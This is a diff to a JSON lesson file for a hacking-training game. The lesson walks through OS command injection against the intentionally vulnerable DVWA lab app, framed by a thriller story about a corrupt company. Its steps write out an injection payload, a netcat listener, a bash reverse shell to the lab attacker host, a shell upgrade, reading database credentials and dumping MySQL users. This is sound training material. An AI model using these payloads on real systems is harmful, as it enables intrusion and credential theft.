@@ -7,68 +7,82 @@
   "port": 80,
   "short_description": "Exploit command injection in DVWA to get a reverse shell on the web server.",
   "description": "DVWA (Damn Vulnerable Web Application) has a command injection vulnerability in the 'ping' functionality. We'll exploit this to execute arbitrary commands and get a reverse shell. This teaches OS command injection - OWASP Top 10 #1.",
+
+  "episode_number": 6,
+  "episode_title": "INPUT VALIDATION",
+  "next_episode_id": "sqli-dvwa",
+
+  "handler_message": "Cerberus maintains a public-facing customer portal at 172.20.0.10. Behind the corporate facade, the application is riddled with vulnerabilities.\n\nThe development team prioritized features over security. Command injection in the network diagnostics page. Classic mistake.\n\nBut here's what matters: the portal's database contains customer records. And those customers don't match any legitimate business. Shell companies. Fronts. The money laundering infrastructure that keeps NIGHTFALL funded.\n\nGet a shell. Then we dig into their data.",
+
+  "episode_intro": "The false flag evidence is damning. But evidence doesn't explain motive.\n\nWhy would anyone engineer a massive infrastructure attack on their own country? Who benefits when power grids fail and water systems go offline?\n\nFollow the money. That's the answer. Somewhere in Cerberus's systems is the financial trail - the contracts, the shell companies, the offshore accounts that make NIGHTFALL profitable.\n\nThe customer portal is the first thread. A web application with more holes than security. Command injection in the ping function. Amateur hour.\n\nBut behind the sloppy code is a database full of transactions. Customers who don't exist. Payments for services never rendered.\n\nTime to see who's been paying for the end of the world.",
+
+  "episode_outro": "The shell gives you access. And the access reveals the truth.\n\nThe customer database is a fiction. Company names that sound real but have no presence. Addresses that map to empty lots. Bank accounts that route through a maze of offshore entities.\n\nBut the money is very real. Millions flowing into Cerberus from sources that don't exist. Payments for 'infrastructure consulting' that never happened.\n\nYou find references to a 'primary investor' - no name, just a code: PROMETHEUS. The largest deposits trace back to accounts in Cyprus, the Caymans, and Singapore.\n\nWhoever PROMETHEUS is, they're funding NIGHTFALL. And the database behind this portal might have more details.\n\nSQL injection is the next step. Bypass the application layer. Talk directly to the data.",
+
+  "interstitial": {
+    "title": "Episode 6: INPUT VALIDATION",
+    "content": "PREVIOUSLY: The build farm revealed Cerberus's false flag strategy. Chinese strings. Beijing IP addresses. Compilation timestamps from the wrong timezone.\n\nThey're not just planning an attack - they're manufacturing evidence to blame another nation.\n\nBut evidence doesn't explain motive. Why would an American company engineer an attack on American infrastructure?\n\nFollow the money. Cerberus's customer portal at 172.20.0.10 handles financial transactions. And the development team left command injection vulnerabilities in the network diagnostics page.\n\nGet a shell. Find the money trail. Understand who profits when NIGHTFALL goes live."
+  },
+
   "steps": [
     {
       "title": "Open DVWA in browser",
-      "explanation": "Open http://localhost:8080 in your browser. Default login: admin/password. Set security to 'Low' in DVWA Security settings."
+      "narrative": "The Cerberus customer portal runs on DVWA - a deliberately vulnerable web application. In the real world, this represents any poorly-secured web application. Open http://localhost:8080 and login with admin/password. Set security to 'Low' to simulate a system with no input validation."
     },
     {
       "title": "Navigate to Command Injection",
-      "explanation": "Click 'Command Injection' in the left menu. This page lets you ping an IP. It's supposed to just ping, but we can inject commands."
+      "narrative": "The network diagnostics page accepts an IP address for a ping test. Classic functionality on corporate portals. But the developers trusted user input - fatal mistake. The application doesn't sanitize what you type. Find 'Command Injection' in the left menu."
     },
     {
       "title": "Test command injection",
       "command": "127.0.0.1; id",
-      "explanation": "Enter this in the IP field. The semicolon terminates the ping command and runs 'id'.",
-      "expected": "You should see ping output PLUS 'uid=33(www-data)'"
+      "narrative": "The semicolon terminates the ping command. Everything after it executes as a new command. 'id' shows the current user. If you see www-data's information after the ping results, the injection works. The application is trusting your input and executing it."
     },
     {
       "title": "Set up a listener in Kali",
       "command": "nc -lvnp 4444",
-      "explanation": "Start a Netcat listener on port 4444 to catch our reverse shell. Keep this terminal open - it will wait for a connection."
+      "narrative": "Before sending a reverse shell, you need something to catch it. Netcat in listen mode (-l) on port 4444, verbose (-v), no DNS lookups (-n), with port specification (-p). This terminal will wait for the incoming connection."
     },
     {
-      "title": "Send reverse shell payload (in browser)",
+      "title": "Send reverse shell payload",
       "command": "127.0.0.1; bash -i >& /dev/tcp/172.20.0.5/4444 0>&1",
-      "explanation": "Enter this in the DVWA form and submit. Check your Netcat terminal - you should see a connection!",
+      "narrative": "This is a bash reverse shell. It creates an interactive bash session (-i) and redirects all input/output to a TCP connection to your Kali machine. Enter this in the DVWA form. When you submit, check your Netcat terminal - a shell should connect.",
       "expected": "Netcat shows: connect to [172.20.0.5] from ...",
       "duration": "2-5 sec"
     },
     {
-      "title": "Verify shell access (no prompt - just type!)",
+      "title": "Verify shell access",
       "command": "id",
-      "explanation": "Back in Netcat terminal: There is NO prompt - cursor just blinks. Type 'id' and press Enter anyway!",
+      "narrative": "In your Netcat terminal: no prompt appears, but you have a shell. Type 'id' and press Enter. You're www-data - the web server user. Limited privileges, but enough to explore the application and its data.",
       "expected": "uid=33(www-data) gid=33(www-data)"
     },
     {
       "title": "Check hostname",
       "command": "hostname",
-      "explanation": "Still no prompt - just type!",
-      "expected": "dvwa or similar container name"
+      "narrative": "Confirm you're on the Cerberus portal server. Every compromised system is a pivot point - potential access to internal networks, databases, and other systems that the public-facing server can reach."
     },
     {
       "title": "Upgrade to interactive shell",
       "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
-      "explanation": "Now you get a real prompt! If python3 fails, try 'python' instead.",
+      "narrative": "Spawn a proper terminal. Raw reverse shells are functional but awkward. Python's pty module gives you command history, tab completion, and proper signal handling. Much more comfortable for extended exploration.",
       "expected": "www-data@dvwa:/$ prompt appears"
     },
     {
       "title": "Explore the web root",
       "command": "ls -la /var/www/html/",
-      "explanation": "Browse the web application files. Look for config files with database credentials."
+      "narrative": "The web root contains the application code. Configuration files often include database credentials, API keys, and other secrets that developers shouldn't have committed. Look for config.php, .env files, anything that might contain credentials."
     },
     {
       "title": "Read database config",
       "command": "cat /var/www/html/config/config.inc.php",
-      "explanation": "Extract database credentials for further access.",
+      "narrative": "Database credentials. Username, password, host, database name. This is how web applications store connection information - often in plaintext in config files. With these credentials, you can access the database directly and bypass application-level controls.",
       "expected": "MySQL username and password"
     }
   ],
-  "success_criteria": "You have a shell on the DVWA container as www-data. You can read files and explore the system.",
+  "success_criteria": "You have a shell on the Cerberus portal server. Database credentials are exposed. You can explore the application and prepare for SQL injection attacks.",
   "pwn_command": "pwn dvwa",
   "next_steps": [
-    "Try SQL Injection in DVWA to dump the database",
-    "Attempt privilege escalation to root",
-    "Explore other DVWA vulnerabilities: XSS, CSRF, File Upload"
+    "Connect to MySQL: mysql -u root -p",
+    "List databases: SHOW DATABASES;",
+    "Extract user data: SELECT * FROM users;"
   ]
 }
